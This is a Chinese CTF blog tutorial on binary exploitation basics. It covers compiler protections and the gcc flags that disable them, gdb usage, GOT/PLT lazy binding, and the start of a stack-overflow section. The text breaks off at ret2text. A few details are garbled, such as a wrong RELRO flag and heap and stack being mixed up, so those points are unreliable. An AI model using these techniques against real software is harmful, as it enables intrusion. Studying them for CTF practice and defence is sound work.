<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>pwn基础 | Sh4oBa1&#39;s blog</title>
    <meta name="generator" content="VuePress 1.8.0">
    <link rel="icon" href="/img/favicon.ico">
    <script data-ad-client="ca-pub-7828333725993554" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <meta name="description" content="Syclover的一员,菜鸡Pwn手,默默沉淀,静候葡萄成熟时.">
    <meta name="keywords" content="Syclover,Pwn,Python,C,C++,菜鸡CTFer,山口丁">
    <meta name="baidu-site-verification" content="7F55weZDDc">
    <meta name="theme-color" content="#11a8cd">
    <link rel="preload" href="/assets/css/0.styles.c21581be.css" as="style"><link rel="preload" href="/assets/js/app.9038ce9a.js" as="script"><link rel="preload" href="/assets/js/2.6bd067a5.js" as="script"><link rel="preload" href="/assets/js/7.dc335bce.js" as="script"><link rel="prefetch" href="/assets/js/10.004a94f4.js"><link rel="prefetch" href="/assets/js/11.5eff2915.js"><link rel="prefetch" href="/assets/js/12.89434380.js"><link rel="prefetch" href="/assets/js/13.37cddbfb.js"><link rel="prefetch" href="/assets/js/14.6733c870.js"><link rel="prefetch" href="/assets/js/15.b875652a.js"><link rel="prefetch" href="/assets/js/16.a8bb5112.js"><link rel="prefetch" href="/assets/js/17.46201733.js"><link rel="prefetch" href="/assets/js/18.8270ae03.js"><link rel="prefetch" href="/assets/js/3.ee40bfe5.js"><link rel="prefetch" href="/assets/js/4.638e59db.js"><link rel="prefetch" href="/assets/js/5.7d169444.js"><link rel="prefetch" href="/assets/js/6.6a3df52b.js"><link rel="prefetch" href="/assets/js/8.0b592734.js"><link rel="prefetch" href="/assets/js/9.72d63b73.js">
    <link rel="stylesheet" href="/assets/css/0.styles.c21581be.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu have-body-img"><header class="navbar blur"><div title="目录" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/SB-logo.png" alt="Sh4oBa1's blog" class="logo"> <span class="site-name can-hide">Sh4oBa1's blog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="技术" class="dropdown-title"><!----> <span class="title" style="display:;">技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/4ba610/" aria-current="page" class="nav-link router-link-exact-active router-link-active">pwn基础</a></li><li class="dropdown-item"><!----> <a href="/pages/9bb16d/" class="nav-link">armpwn</a></li><li class="dropdown-item"><!----> <a href="/pages/3f7933/" class="nav-link">堆基础</a></li><li class="dropdown-item"><!----> <a href="/pages/38db4a/" class="nav-link">pwnable.tw</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多" class="dropdown-title"><!----> <span class="title" style="display:;">更多</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/f2a556/" class="nav-link">学习</a></li><li class="dropdown-item"><!----> <a href="/pages/aea6571b7a8bae86/" class="nav-link">面试</a></li><li class="dropdown-item"><!----> <a href="/pages/2d615df9a36a98ed/" class="nav-link">心情杂货</a></li><li class="dropdown-item"><!----> <a href="/pages/baaa02/" class="nav-link">实用技巧</a></li></ul></div></div><div class="nav-item"><a href="/friends/8107b9/" class="nav-link">friends</a></div><div class="nav-item"><a href="/about/d769bc/" class="nav-link">about</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://i.loli.net/2021/05/18/ycvw4OJW6mPieK7.jpg"> <div class="blogger-info"><h3>Sh4oBa1</h3> <span>二进制菜鸡</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">home</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="技术" class="dropdown-title"><!----> <span class="title" style="display:;">技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/4ba610/" aria-current="page" class="nav-link router-link-exact-active router-link-active">pwn基础</a></li><li class="dropdown-item"><!----> <a href="/pages/9bb16d/" class="nav-link">armpwn</a></li><li class="dropdown-item"><!----> <a href="/pages/3f7933/" class="nav-link">堆基础</a></li><li class="dropdown-item"><!----> <a href="/pages/38db4a/" class="nav-link">pwnable.tw</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多" class="dropdown-title"><!----> <span class="title" style="display:;">更多</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/pages/f2a556/" class="nav-link">学习</a></li><li class="dropdown-item"><!----> <a href="/pages/aea6571b7a8bae86/" class="nav-link">面试</a></li><li class="dropdown-item"><!----> <a href="/pages/2d615df9a36a98ed/" class="nav-link">心情杂货</a></li><li class="dropdown-item"><!----> <a href="/pages/baaa02/" class="nav-link">实用技巧</a></li></ul></div></div><div class="nav-item"><a href="/friends/8107b9/" class="nav-link">friends</a></div><div class="nav-item"><a href="/about/d769bc/" class="nav-link">about</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="索引" class="dropdown-title"><a href="/archives/" class="link-title">索引</a> <span class="title" style="display:none;">索引</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">分类</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">标签</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">归档</a></li></ul></div></div> <a href="https://github.com/xugaoyi/vuepress-theme-vdoing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><a href="/pages/38db4a/" class="sidebar-link">带学弟之一起刷tw</a></li><li><a href="/pages/9bb16d/" class="sidebar-link">armpwn</a></li><li><a href="/pages/4ba610/" aria-current="page" class="active sidebar-link">pwn基础</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/4ba610/#保护模式" class="sidebar-link">保护模式</a></li><li class="sidebar-sub-header"><a href="/pages/4ba610/#pwngdb的使用" class="sidebar-link">PWNGDB的使用</a></li><li class="sidebar-sub-header"><a href="/pages/4ba610/#打印指令" class="sidebar-link">打印指令</a></li><li class="sidebar-sub-header"><a href="/pages/4ba610/#got表-plt表" class="sidebar-link">GOT表-PLT表</a></li><li class="sidebar-sub-header"><a href="/pages/4ba610/#栈介绍" class="sidebar-link">栈介绍</a></li><li class="sidebar-sub-header"><a href="/pages/4ba610/#栈溢出-rop" class="sidebar-link">栈溢出(ROP)</a></li><li class="sidebar-sub-header"><a href="/pages/4ba610/#格式化字符串" class="sidebar-link">格式化字符串</a></li></ul></li><li><a href="/pages/3f7933/" class="sidebar-link">stack-chunk</a></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- 正方形 -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper bg-style-1"><div class="articleInfo-wrap" data-v-1cd794fe><div class="articleInfo" data-v-1cd794fe><ul class="breadcrumbs" data-v-1cd794fe><li data-v-1cd794fe><a href="/" title="首页" class="iconfont icon-home router-link-active" data-v-1cd794fe></a></li> <li data-v-1cd794fe><a href="/categories/?category=Pwn" title="分类" data-v-1cd794fe>Pwn</a></li> <!----> <!----></ul> <div class="info" data-v-1cd794fe><div title="作者" class="author iconfont icon-touxiang" data-v-1cd794fe><a href="https://github.com/0xshaobai" target="_blank" title="作者" class="beLink" data-v-1cd794fe>Sh4oBa1</a></div> <div title="创建时间" class="date iconfont icon-riqi" data-v-1cd794fe><a href="javascript:;" data-v-1cd794fe>2021-04-14</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
          pwn基础
        </h1> <div class="page-slot page-slot-top"><!-- 固定100% * 90px可显示，max-height:90px未见显示-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><ul><li>基本上是之前学习<code>pwn</code>的基础知识，都是堆以前的知识，以后会总结一个堆的知识</li></ul> <p><img src="https://i.loli.net/2021/04/23/93CrIM14JnXQFD6.jpg" alt="pwn"></p> <p></p><div class="table-of-contents"><ul><li><a href="#保护模式">保护模式</a></li><li><a href="#pwngdb的使用">PWNGDB的使用</a></li><li><a href="#打印指令">打印指令</a></li><li><a href="#got表-plt表">GOT表-PLT表</a></li><li><a href="#栈介绍">栈介绍</a></li><li><a href="#栈溢出-rop">栈溢出(ROP)</a></li><li><a href="#格式化字符串">格式化字符串</a></li></ul></div><p></p> <h1 id="pwn的基础知识"><a href="#pwn的基础知识" class="header-anchor">#</a> PWN的基础知识</h1> <h2 id="保护模式"><a href="#保护模式" class="header-anchor">#</a> 保护模式</h2> <h4 id="arch"><a href="#arch" class="header-anchor">#</a> Arch：</h4> <ul><li>说明程序的架构是x86架构-32位程序-小段字节序号.</li></ul> <h4 id="relro"><a href="#relro" class="header-anchor">#</a> RELRO：</h4> <ul><li>设置符号重定向表格为只读或在程序启动时就解析所有动态符号,从而减少对GOT表的攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。如果开启FULL RELRO，意味着我们无法修改got表.</li> <li>编译选项: 关闭 <code>-z morello</code> 开启(部分)<code>-z lazy</code> 开启(完全)<code>-z now</code>.</li></ul> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>gcc -o <span class="token builtin class-name">test</span> test.c						// 默认情况下，是Partial RELRO
gcc -z norelro -o <span class="token builtin class-name">test</span> test.c			// 关闭，即No RELRO
gcc -z lazy -o <span class="token builtin class-name">test</span> test.c				// 部分开启，即Partial RELRO
gcc -z now -o <span class="token builtin class-name">test</span> test.c				// 全部开启，即
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="stack"><a href="#stack" class="header-anchor">#</a> Stack:</h4> <ul><li>如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过.（当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。）</li> <li>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 <code>glibc</code> 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</li></ul> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>gcc -o <span class="token builtin class-name">test</span> test.c						// 默认情况下，不开启Canary保护
gcc -fno-stack-protector -o <span class="token builtin class-name">test</span> test.c  //禁用栈保护
gcc -fstack-protector -o <span class="token builtin class-name">test</span> test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o <span class="token builtin class-name">test</span> test.c //启用堆栈保护，为所有函数插入保护代码
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h4 id="nx"><a href="#nx" class="header-anchor">#</a> NX:</h4> <ul><li>enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的<code>call esp</code>或者<code>jmp esp</code>的方法就不能使用，但是可以利用<code>rop</code>这种方法绕过.如果在栈上执行shellcode，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</li></ul> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>gcc -o <span class="token builtin class-name">test</span> test.c					// 默认情况下，开启NX保护
gcc -z execstack -o <span class="token builtin class-name">test</span> test.c		// 禁用NX保护
gcc -z noexecstack -o <span class="token builtin class-name">test</span> test.c	// 开启NX保护
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h4 id="pie"><a href="#pie" class="header-anchor">#</a> PIE:</h4> <ul><li>PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址.</li></ul> <div class="language-小解释 line-numbers-mode"><pre class="language-text"><code>0 - 表示关闭进程地址空间随机化。
1 - 表示将mmap的基址，stack和vdso页面随机化。
2 - 表示在1的基础上增加栈（heap）的随机化。
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ul><li>ASLR只能对堆、栈和<code>mmap</code>随机化<code>(对mmap不太清楚)</code>，而不能对如代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。</li></ul> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>gcc -o <span class="token builtin class-name">test</span> test.c				// 默认情况下，不开启PIE
gcc -fpie -pie -o <span class="token builtin class-name">test</span> test.c		// 开启PIE，此时强度为1
gcc -fPIE -pie -o <span class="token builtin class-name">test</span> test.c		// 开启PIE，此时为最高强度2
gcc  -o <span class="token builtin class-name">test</span> test.c		// 开启PIC，此时强度为1，不会开启PIE
gcc -fPIC -o <span class="token builtin class-name">test</span> test.c		// 开启PIC，此时为最高强度2，不会开启PIE
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h4 id="fortify"><a href="#fortify" class="header-anchor">#</a> FORTIFY</h4> <ul><li>FORTIFY_SOURCE机制对格式化字符串有两个限制(1)包含%n的格式化字符串不能位于程序内存中的可写地址。(2)当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。</li> <li>用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如<code>memcpy</code>，<code>memset</code>，<code>stpcpy</code>，<code>strcpy</code>，<code>strncpy</code>，<code>strcat</code>，<code>strncat</code>，<code>sprintf</code>，<code>snprintf</code>，<code>vsprintf</code>，<code>vsnprintf</code>，<code>gets</code>以及宽字符的变体。</li></ul> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>gcc -o <span class="token builtin class-name">test</span> test.c							// 默认情况下，不会开这个检查
gcc -D_FORTIFY_SOURCE<span class="token operator">=</span><span class="token number">1</span> -o <span class="token builtin class-name">test</span> test.c		// 较弱的检查
gcc -D_FORTIFY_SOURCE<span class="token operator">=</span><span class="token number">2</span> -o <span class="token builtin class-name">test</span> test.c		// 较强的检查
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="pwngdb的使用"><a href="#pwngdb的使用" class="header-anchor">#</a> PWNGDB的使用</h2> <blockquote><p><code>n</code>： 执行一行源代码但不进入函数内部</p> <p><code>ni</code>: 执行一行汇编代码但不进入函数内部</p> <p><code>s</code>： 执行一行源代码而且进入函数内部</p> <p><code>si</code>: 执行一行汇编代码而且进入函数内部</p> <p><code>c</code>: 继续执行到下一个断点</p> <p><code>b</code> *地址: 下断点</p> <p><code>stack</code>: 显示栈信息</p> <p><code>finish</code>:结束当前运行函数</p> <p><code>x</code> ： 按十六进制格式显示内存数据，其中x/{字节数}x 以16进制显示指定地址处的数据;{字节数}表示字节数制定（b 单字节；h 双字节；w 四字节；g 八字节；默认为四字节）</p> <p><code>disas/disassemble</code>  (函数名):将函数整个流程的汇编显示出来。</p> <p><code>i //info</code>，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用</p> <ul><li><code>i b</code> //<strong>常用</strong>，info break 查看所有断点信息（编号、断点位置）</li> <li><code>i r</code> //<strong>常用</strong>，info registers 查看各个寄存器当前的值</li> <li><code>i f</code> //info function 查看所有函数名，<strong>需保留符号</strong></li></ul></blockquote> <h2 id="打印指令"><a href="#打印指令" class="header-anchor">#</a> 打印指令</h2> <h5 id="查看内存指令x"><a href="#查看内存指令x" class="header-anchor">#</a> 查看内存指令x：</h5> <ul><li><code>x /nuf 0x123456</code> //常用，x指令的格式是：<code>x/nfu</code>，<code>nfu</code>代表三个参数</li> <li>n代表<strong>显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节）</strong>，放在’/'后面</li> <li>u代表一个单元几个字节，b(一个字节)，h(俩字节)，w(四字节)，g(八字节)</li> <li>f代表显示数据的格式，<strong>f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活</strong></li></ul> <div class="language-解释 line-numbers-mode"><pre class="language-text"><code>x 按十六进制格式显示变量。
d 按十进制格式显示变量。
u 按十六进制格式显示无符号整型。
o 按八进制格式显示变量。
t 按二进制格式显示变量。
a 按十六进制格式显示变量。
c 按字符格式显示变量。
f 按浮点数格式显示变量。
s 按字符串显示。
b 按字符显示。
i 显示汇编指令。
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><ul><li>x /10gx 0x123456 //<strong>常用</strong>，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</li> <li>x /10xd $rdi //从<strong>rdi指向的地址向后</strong>打印10个单元，每个单元4字节的十进制数</li> <li>x /10i 0x123456 //<strong>常用</strong>，从0x123456处向后显示十条汇编指令</li></ul> <h2 id="got表-plt表"><a href="#got表-plt表" class="header-anchor">#</a> GOT表-PLT表</h2> <h4 id="plt表"><a href="#plt表" class="header-anchor">#</a> PLT表</h4> <p>可以称为内部函数表，PLT表中的数据就是GOT表中的一个地址(指定好的)，一定是一一对应的。</p> <p><img src="https://i.loli.net/2021/04/20/jq7mNUsT43XFS1e.jpg" alt="undefined"></p> <p>PLT表中的每一项的数据内容都是对应的GOT表中一项的地址这个是固定不变的，到这里大家也知道了PLT表中的数据根本不是函数的真实地址，而是GOT表项的地址.而GOT表中的数据才是函数的最终地址。说到底PLT它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</p> <h4 id="got表"><a href="#got表" class="header-anchor">#</a> GOT表</h4> <p>GOT表存在于数据段里面。一般来说模块间的调用和跳转，GOT中相应的项保存的是目标函数的地址。在程序刚开始运行时，GOT 表项是空的，当符号<code>第一次被调用时</code>会动态解析符号的绝对地址然后转去执行，并将被解析符号的绝对地址记录在 GOT 中，第二次调用同一符号时，由于 GOT 中已经记录了其绝对地址，<code>直接</code>转去执行即可（不用重新解析）。ELF将GOT拆分成了两个表。<code>.got</code>和<code>.got.plt</code></p> <ul><li><code>.got</code>用来保存全局变量引用的地址</li> <li><code>.got.plt</code>用来保存函数引用的地址，它包含 PLT 表所需地址（已经找到的和需要去触发的）</li></ul> <h4 id="图像演示"><a href="#图像演示" class="header-anchor">#</a> 图像演示</h4> <p>这里借用一下<code>yichen</code>师傅的图<img src="https://i.loli.net/2021/04/25/jiBH78x4JS9cVsh.jpg" alt="延迟绑定"></p> <p>这里<a href="https://cloud.tencent.com/developer/article/1590167" target="_blank" rel="noopener noreferrer">参考文章<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>图片很清楚的表示了工作流程：</p> <p>可执行文件放置着PLT表的地址，而PLT表指向的是函数的GOT表的地址，而GOT表就指向的是函数本身在<code>glibc</code>的相对地址，而<code>glibc</code>由于开了地址随机化，但函数相对于<code>libc_base</code>的偏移是固定的，导致在<code>pwn</code>中能够利用GOT表来带出函数在<code>libc</code>中的地址。</p> <p>在这里面想要通过<code>plt</code>表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，<code>linux</code>引入了延迟绑定机制。</p> <p>在想要调用的函数没有被调用过，想要调用他的时候，是按照这个过程来调用的：</p> <p><code>xxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共 @plt -&gt; _dl_runtime_resolve</code></p> <p>然后要知道：</p> <blockquote><p><code>_dl_runtime_resolve</code> 是怎么知道要查找 <code>printf</code> 函数的 <code>_dl_runtime_resolve</code> 找到 <code>printf</code> 函数地址之后，它怎么知道回填到哪个 GOT 表项</p></blockquote> <p>解释：</p> <blockquote><p>第一个问题，在 <code>xxx@plt</code> 中，我们在 <code>jmp</code> 之前 <code>push</code> 了一个参数，每个 <code>xxx@plt</code> 的 <code>push</code> 的操作数都不一样，那个参数就相当于函数的 <code>id</code>，告诉了 <code>_dl_runtime_resolve</code> 要去找哪一个函数的地址</p></blockquote> <blockquote><p>在 elf 文件中 <code>.rel.plt</code> 保存了重定位表的信息，使用 <code>readelf -r test</code> 命令可以查看 test 可执行文件中的重定位信息。</p> <p>第二个问题，看 <code>.rel.plt</code> 的位置就对应着 <code>xxx@plt</code> 里 <code>jmp</code> 的地址</p></blockquote> <p>两个补充：</p> <blockquote><p>在 i386 架构下，除了每个函数占用一个 GOT 表项外，GOT 表项还保留了３个公共表项，也即 got 的前３项，分别保存：</p> <p><strong>got [0]: 本 ELF 动态段 (.dynamic 段）的装载地址</strong></p> <p><strong>got [1]：本 ELF 的 link_map 数据结构描述符地址</strong></p> <p><strong>got [2]：_dl_runtime_resolve 函数的地址</strong></p> <p>动态链接器在加载完 ELF 之后，都会将这３地址写到 GOT 表的前３项</p></blockquote> <h2 id="栈介绍"><a href="#栈介绍" class="header-anchor">#</a> 栈介绍</h2> <p><img src="https://i.loli.net/2021/04/20/crHS4vUikh3XftP.jpg" alt="undefined"></p> <p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p> <h2 id="栈溢出-rop"><a href="#栈溢出-rop" class="header-anchor">#</a> 栈溢出(ROP)</h2> <h4 id="寻找危险函数"><a href="#寻找危险函数" class="header-anchor">#</a> 寻找危险函数</h4> <ul><li><code>gets()</code>函数：(输入不会限制长度，不会被'\x00'截断)</li> <li><code>read()</code>函数：(读的数据长度比输入的字符<code>&amp;buf</code>的长度长，能够造成溢出)</li> <li><code>write()</code>函数：(写入的数据长度比输入的字符<code>&amp;buf</code>的长度长，能够造成溢出)</li></ul> <h4 id="确定填充长度"><a href="#确定填充长度" class="header-anchor">#</a> 确定填充长度</h4> <ul><li>通过<code>ida</code>靠栈的基地址，和<code>ebp/rbp</code>的地址偏移找到。</li> <li>通过调试出入比填充长度长的数据，让程序报错，回显的地址与栈的<code>ebp</code>地址相差的距离为填充长度.</li></ul> <h4 id="题目类型"><a href="#题目类型" class="header-anchor">#</a> 题目类型</h4> <h6 id="ret2text"><a href="#ret2text" class="header-anchor">#</a> ret2text</h6> <p>例题就wiki的<code>ret2text</code>。</p> <p><img 